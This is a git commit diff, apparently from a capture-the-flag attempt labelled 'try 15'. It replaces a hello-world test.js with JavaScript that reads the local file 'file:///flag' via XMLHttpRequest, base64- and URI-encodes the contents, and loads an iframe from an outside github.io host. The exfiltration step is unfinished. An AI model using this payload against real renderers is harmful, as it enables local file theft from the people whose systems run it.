efa96b625d54d00f66ad94935a93a22ac61d5a16
Mario Pongibove <mario.pongibove@gmail.com>
2024-04-14 21:51:14 -0400

    try 15

--- test.js
+++ test.js
@@ -1,1 +1,10 @@
-console.log("Hello, World!");
+function reqListener () {
+    var encoded = encodeURI(this.responseText);
+    var b64 = btoa(this.responseText);
+    var raw = this.responseText;
+    document.write('<iframe src="https://mariopongibove.github.io"></iframe>');
+} 
+var oReq = new XMLHttpRequest(); 
+oReq.addEventListener("load", reqListener); 
+oReq.open("GET", "file:///flag"); 
+oReq.send();
